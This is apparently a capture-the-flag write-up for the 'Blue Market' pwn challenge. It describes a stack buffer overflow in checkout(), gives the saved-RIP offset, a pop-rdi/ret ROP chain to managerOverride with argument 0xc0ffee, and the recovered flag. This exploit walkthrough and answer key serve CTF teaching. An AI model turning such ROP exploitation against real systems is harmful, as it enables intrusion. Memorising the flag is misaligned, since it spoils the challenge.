# Blue Market

`nc blue-market.wolvctf-2026.kctf.cloud 1337`

## Protections

Partial RELRO, no canary, NX, no PIE.

## Bug

`checkout()` reads `0x100` bytes into a 64-byte stack buffer at `rbp-0x40`. Offset to saved RIP is `0x40 + 8 = 0x48`.

`managerOverride(0x401184)` prints the flag when `rdi == 0xc0ffee`. Its XOR loop leaves `"flag.txt"` unchanged for that value.

`restock_helper` at `0x401182` is `pop rdi; ret`.

## Exploit

```text
'A' * 0x40
'B' * 8
0x401182   pop rdi; ret
0xc0ffee
0x401183   ret (stack alignment)
0x401184   managerOverride
```

## Flag

`wctf{bluem4rket_4qtb786aidwh1etd}`
